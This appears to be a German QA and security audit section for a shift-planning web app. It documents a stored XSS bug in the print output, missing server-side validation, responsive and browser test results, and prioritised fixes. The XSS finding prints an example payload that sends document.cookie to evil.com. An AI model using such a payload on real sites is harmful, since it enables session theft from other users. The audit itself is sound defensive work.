| SEC-S3-5 | XSS in Druck-Output arb/vor Felder | HIGH | `buildShiftPageDiv` Zeile 149/156: `${shift.arb \|\| ''}` und `${shift.vor \|\| ''}` werden OHNE `escHtml()` in den HTML-String eingefuegt. Da diese Felder HTML enthalten koennen (RichTextArea mit contentEditable), wird beliebiges HTML/JS im Druckfenster ausgefuehrt. Zusammen mit `'unsafe-inline'` in CSP ist dies ein exploitbarer Stored-XSS-Vektor. **HINWEIS:** Im Screen-Rendering (shift-card.tsx) wird DOMPurify verwendet (Zeile 187-193), aber NUR fuer die Kartenansicht. Der Druck-Output umgeht DOMPurify komplett. Siehe **BUG-S3-7**. |
| SEC-S3-6 | Keine serverseitige Validierung fuer Shift-CRUD | MEDIUM | Alle Shift-Operationen gehen direkt via Supabase Client. Keine Zod-Validierung, keine API-Route. RLS schuetzt Zugriff, aber nicht Inhaltsvalidierung (z.B. `typ` koennte einen nicht-validen Wert enthalten). |

#### BUG-S3-7: Stored XSS via Druck-Output (arb/vor Felder nicht escaped)
- **Severity:** HIGH
- **Datei:** `src/app/projekte/[id]/page.tsx:149, 156`
- **Beschreibung:** Die Felder `shift.arb` (Ausgefuehrte Arbeiten) und `shift.vor` (Vorkommnisse) enthalten HTML-Markup (aus dem RichTextArea contentEditable-Editor). Im Druck-Output (`buildShiftPageDiv`) werden sie ohne `escHtml()` direkt in das HTML-Template injiziert. Alle anderen Felder (firm, name, nr, ag, gl, wit, bod, beruf, typ) werden korrekt ueber `escHtml()` escaped.
- **Angriffsvektor:** Nutzer A speichert `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` im Feld "Ausgefuehrte Arbeiten". Nutzer B (selbe Firma) oeffnet die Schicht und klickt "Drucken" -- das Druckfenster fuehrt das Script aus.
- **Abmilderung:** DOMPurify wird in der Kartenansicht (`shift-card.tsx:187-193`) verwendet, aber der Druck-Code liest die Werte aus dem State-Objekt, nicht aus dem sanitized DOM. DOMPurify schutzt die Karte, nicht den Druck.
- **Fix-Vorschlag:** `escHtml(shift.arb || '')` statt `${shift.arb || ''}` verwenden. Alternativ DOMPurify auch serverseitig/im buildShiftPageDiv anwenden.
- **Priority:** Fix vor Deployment -- High-Severity XSS-Luecke.

---

### Cross-Browser / Responsive

| Aspekt | Status | Anmerkung |
|--------|--------|-----------|
| 375px (Mobile) | EINSCHRAENKUNG | A4-Karten (210mm = 793px physisch) sind bei 40% Zoom 317px breit -- passt gerade auf Mobile. Aber: KW-Navigation + Zoom + Print-Button sind nebeneinander und koennen auf 375px eng werden. Buttons/Chips sind klein aber antippbar. |
| 768px (Tablet) | PASS | Grid mit 2-3 Karten bei 50-60% Zoom passt. |
| 1440px (Desktop) | PASS | Grid mit 5-7 Karten bei 75-100% Zoom. |
| Chrome | PASS (erwartet) | Standard CSS Grid + transform scale |
| Firefox | PASS (erwartet) | Keine browser-spezifischen Features |
| Safari | EINSCHRAENKUNG | `contentEditable` (RichTextArea) hat bekannte Safari-Quirks bei `document.execCommand('underline')`. `time` Input-Typ wird als Text gehandhabt (custom TimeInput). `new Date('YYYY-MM-DD')` wird korrekt via `parseISO` aus date-fns gehandhabt. |

---

### Zusammenfassung

| Kategorie | Anzahl |
|-----------|--------|
| Acceptance Criteria PASS | 24/25 (1x FAIL: Dot-Raster Farbe) |
| Edge Cases PASS | 9/9 |
| Bugs gefunden | 7 (1x High, 2x Medium, 4x Low) |
| Security Issues | 1x High (XSS im Druck), 2x Medium (keine Server-Validierung, kein projectId-Check) |
| Production Ready | **NEIN** -- BUG-S3-7 (XSS im Druck) muss vor Deployment gefixt werden |

**Empfohlene naechste Schritte:**
1. (P0) BUG-S3-7: `escHtml()` fuer `shift.arb` und `shift.vor` im Druck-Output anwenden
2. (P1) BUG-S3-3: km-Felder auf der Karte und im Druck anzeigen
3. (P2) BUG-S3-2: Fehler-Feedback bei CRUD-Operationen
4. (P3) BUG-S3-1/S3-4/S3-5/S3-6: UX-Verbesserungen

## Deployment
_To be added by /deploy_
